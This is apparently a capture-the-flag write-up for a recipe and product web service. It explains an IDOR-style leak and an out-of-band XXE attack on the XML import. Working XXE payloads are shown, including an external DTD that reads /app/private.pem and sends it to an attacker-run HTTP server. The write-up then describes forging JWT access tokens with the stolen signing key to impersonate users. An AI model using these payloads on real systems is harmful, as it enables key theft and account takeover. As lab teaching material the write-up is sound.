## 1. Flag in product manufacturer

It is possible to add products of other users to a dish. You still not be able to get product itself directly, but desired product field `manufacturer` is provided with products in ingredients list of a dish.

## 2. Flag in dish recipe

Second vulnerability is in XML import feature. Badly configured XmlReader allows to define external entities in XML as content of local text file or, for example, as response on GET request to external HTTP server, thus you can do XXE injection.

Luckily, RSA private key for signing access tokens is in *.pem* format so it can be a part of correct XML file. And if you steal private key, you can get authorized for any user as long as you know user id.

At first sight you can just define product name as content of *private.pem* file and get it with product:

```xml
<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE products [
<!ENTITY xxe SYSTEM "file:///app/private.pem">
]>
<products>
    <product>
        <name>&xxe;</name>
        <calories>89</calories>
    </product>
</products>
```

But this XML would not be import because database allows only 100 symbols length for text fields of product. However it is possible to make file content a part of GET request. 

When you want to make entity a part of other entity, one XML document is not enough.

Suppose you start a server listening on address `http://192.168.0.101:20001`. Then you should import such XML:

```xml
<!DOCTYPE products [
<!ENTITY % xxe SYSTEM "http://192.168.0.101:20001">
%xxe;
%int;
]>

<products>
    <product>
        <name>&send;</name>
        <calories>89</calories>
    </product>
</products>
```

When XML-processor tries to determine value of `%xxe` entity, it send request to your server, which should reply with such content:

```xml
<!ENTITY % payl SYSTEM "file:///app/private.pem">
<!ENTITY % int "<!ENTITY send SYSTEM 'http://192.168.0.101:20001?p=%payl;'>">
```

Call to `%xxe` entity happens in `DOCTYPE` part (**Document Type Definition**) and it is defined with `%`. It means that this entity should contain not simple text to paste but some defenitions of other elements, entities and so on and before pasting XML-processor should prepare its content like correct fragment of Document Type Definition. So it pastes value of `%payl` in internal string entity `%int` and content of *private.pem* becomes query parameter value.

Then in initial XML call to `%int` defines entity `send`. And call to `&send ` in product name makes server to send request with *private.pem* content in query parameter to your server in order to know name of product. The implementation of this part of attack is presented in *xxe_handler.py* and *import_xml.py*



Let's look at structure of authorization token in https://jwt.io/:  

**Bearer eyJhbGciOiJQUzUxMiIsInR5cCI6ImF0K2p3dCJ9.eyJuYmYiOjE1NzQ1MTE4NDgsImV4cCI6MTU3NDUxNTQ0OCwiaXNzIjoiaHR0cDovLzEwLjYwLjIyLjI6NTAwMCIsImF1ZCI6IkhvdXNlaG9sZEFQSSIsImNsaWVudF9pZCI6IkhvdXNlaG9sZCIsInN1YiI6IjczOTZlY2ZmLTQ3MGQtNGU2YS04N2E4LWFlMGJhYmQ3OTUxZCIsImF1dGhfdGltZSI6MTU3NDUxMTg0NCwiaWRwIjoibG9jYWwiLCJzY29wZSI6WyJvcGVuaWQiLCJwcm9maWxlIiwiSG91c2Vob2xkQVBJIl0sImFtciI6WyJwd2QiXX0.ZXSgs7EZzm5sjxXb068bwIJLfnVJjZ5wpAmNueXgLY6qDLPEQZzaW6xDpOfT87QtqYpWJh9p3vWcINisCItFFMplTFi5pbxMfzOVrBlcTp7cD1V-oJ8JsD1-rddqNoGNYPG4kdV1sNcGknUZJHBtFuFn5cHLE61Jj2YD2SUnEl72Fw_cSYAuIvvo_PlbdbHwzbTWT2-yVj2eRlSm6wQeKiiXYnOa6JRqzVTpv-DzKQVJnBqTKHAmC8PNHNrk6nu6QAxUTQyeu4TiMBdSoA--wPXeq5DFHxsmdhAaKFE33JrWAFrkTlZAYzJJmTVUB8ypXZE7cPvmZbB7zv8qrCDOlQ**

In token there is authorization info and if you put in json any expire date (`"exp"`) and any user id (`"sub"`) and sign json by stolen private key, server will believe us and authorize.

```json
{
  "nbf": 1574511848,
  "exp": 1574515448,
  "iss": "http://10.60.22.2:5000",
  "aud": "HouseholdAPI",
  "client_id": "Household",
  "sub": "7396ecff-470d-4e6a-87a8-ae0babd7951d",
  "auth_time": 1574511844,
  "idp": "local",
  "scope": [
    "openid",
    "profile",
    "HouseholdAPI"
  ],
  "amr": [
    "pwd"
  ]
}
```

So you need to know user ids. You can iterate on dishes and get public data of dish without `recipe` field but with `createdBy`. With fake access tokens for users with dishes you can get all dish data including secret `recipe`. Also you get flags from product `manufacturer`.
